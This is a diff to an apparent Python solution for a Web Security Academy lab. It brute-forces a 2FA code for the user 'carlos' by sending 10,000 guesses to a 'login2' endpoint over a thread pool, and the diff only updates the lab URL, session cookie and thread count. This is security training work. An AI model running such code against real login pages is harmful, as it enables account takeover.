@@ -1,11 +1,11 @@
 import requests
 from concurrent.futures import ThreadPoolExecutor
 
-base_url = 'https://0a81004e0367f1cf82e815cb00e6009d.web-security-academy.net/'
+base_url = 'https://0a31001003d5c10380c185c30041008e.web-security-academy.net/'
 login2_url = f'{base_url}login2'
 
 cookies = {
-    'session':'mMPMQLKWzfVPKj0MksWvGc0K8errn35q',
+    'session':'DvuqT9mh6Y5y2EQGQnsgMLUxMaklbcyK',
     'verify':'carlos'
 }
 
@@ -33,5 +33,5 @@ def check_code(i):
     return False
 
 
-with ThreadPoolExecutor(max_workers=20) as executor:
+with ThreadPoolExecutor(max_workers=30) as executor:
     executor.map(check_code, range(10000))
